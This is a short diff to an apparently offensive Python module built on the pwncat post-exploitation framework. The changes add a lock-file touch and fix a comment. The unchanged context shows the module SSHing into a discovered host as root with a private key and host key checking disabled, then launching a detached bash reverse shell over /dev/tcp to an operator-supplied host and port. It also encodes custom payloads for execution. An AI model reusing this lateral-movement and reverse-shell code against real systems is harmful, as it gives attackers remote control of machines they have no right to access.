@@ -39,6 +39,7 @@ args = parser.parse_args()
 def execute(session: pwncat.manager.Session, task):
     session.log("starting module")
     session_lock = Path("/tmp/pwncat_connector_session.lock")
+    session_lock.touch()
     try:
         if task == "custom":
             payload = base64.b64encode(str(args.payload).encode("utf-8"))
@@ -98,7 +99,7 @@ def execute(session: pwncat.manager.Session, task):
             session.log(f"found ssh target - {ssh_targets[0]}")
 
             # ideally we determine the key using the ssh_keys archive paths
-            # and enumerate? but for not this will have to _cheat_ a little
+            # and enumerate? but for now we will have to _cheat_ a little
 
             ssh_paylod = f'ssh -o StrictHostKeyChecking=accept-new -i ~/.ssh/secret_key root@{ssh_targets[0]} "nohup /bin/bash -c \"TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1\" >/dev/null 2>&1 &"'
             session.log(
